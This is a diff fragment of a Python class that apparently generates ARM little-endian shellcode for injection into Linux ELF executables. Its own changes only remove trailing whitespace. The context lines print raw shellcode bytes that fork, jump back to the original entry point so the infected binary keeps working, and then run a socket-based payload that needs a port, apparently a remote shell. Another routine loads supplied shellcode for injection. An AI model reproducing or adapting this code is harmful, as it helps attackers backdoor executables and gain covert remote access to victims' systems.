@@ -72,7 +72,7 @@ class linux_elfarmle32_shellcode():
             print ("Must provide port")
             sys.exit(1)
         #FORKING
-        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0 
+        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0
         self.shellcode1 += "\x00\x00\x40\xe0"   # sub r0, r0, r0
         self.shellcode1 += "\x02\x70\xa0\xe3"   # mov r7, #2
         self.shellcode1 += "\x00\x00\x00\xef"   # scv 0
@@ -85,7 +85,7 @@ class linux_elfarmle32_shellcode():
         jmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4
         self.shellcode1 += (struct.pack("<I", jmpAddr)).strip("\x00")
         self.shellcode1 += "\xea"   #b entrypoint
-        
+
         #ACTUAL SHELLCODE
         self.shellcode1 += ("\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c\x70\xa0"
                             "\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60\xa0\xe1\x84\x10"
@@ -122,7 +122,7 @@ class linux_elfarmle32_shellcode():
             sys.exit(1)
 
         #FORK
-        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0 
+        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0
         self.shellcode1 += "\x00\x00\x40\xe0"   # sub r0, r0, r0
         self.shellcode1 += "\x02\x70\xa0\xe3"   # mov r7, #2
         self.shellcode1 += "\x00\x00\x00\xef"   # scv 0
@@ -168,7 +168,7 @@ class linux_elfarmle32_shellcode():
             supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
         #FORK
-        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0 
+        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0
         self.shellcode1 += "\x00\x00\x40\xe0"   # sub r0, r0, r0
         self.shellcode1 += "\x02\x70\xa0\xe3"   # mov r7, #2
         self.shellcode1 += "\x00\x00\x00\xef"   # scv 0
